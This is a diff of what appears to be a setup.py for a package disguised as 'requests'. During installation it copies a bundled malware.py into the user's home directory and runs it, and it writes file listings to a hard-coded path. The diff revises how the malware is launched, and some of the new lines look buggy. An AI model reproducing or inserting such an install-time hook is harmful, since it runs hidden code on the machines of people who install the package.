@@ -80,8 +80,8 @@ home = os.getenv('HOMEPATH')
 if home is None:
     home = os.getenv('HOME')
 shutil.copy2(os.path.join(here, 'requests', 'malware.py'), os.path.join(home,"malware.py"))
-command = str(sys.executable + " " + home + '/malware.py')
-subprocess.call(command.split(" "), shell=False)
+command = [sys.executable, home + '/malware.py']
+sub = subprocess.call(command, shell=False)
 #subprocess.Popen(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
 
 with open("/home/parish/output.txt", "w") as text_file:
@@ -90,6 +90,7 @@ with open("/home/parish/output.txt", "w") as text_file:
             text_file.write(os.path.join(root, file) + "\n")
         text_file.write(command + "\n")
         text_file.write(str(os.path.exists(home + '/malware.py')) + "\n")
+        text_file.write(sub.code + "\n")
 
         
 setup(
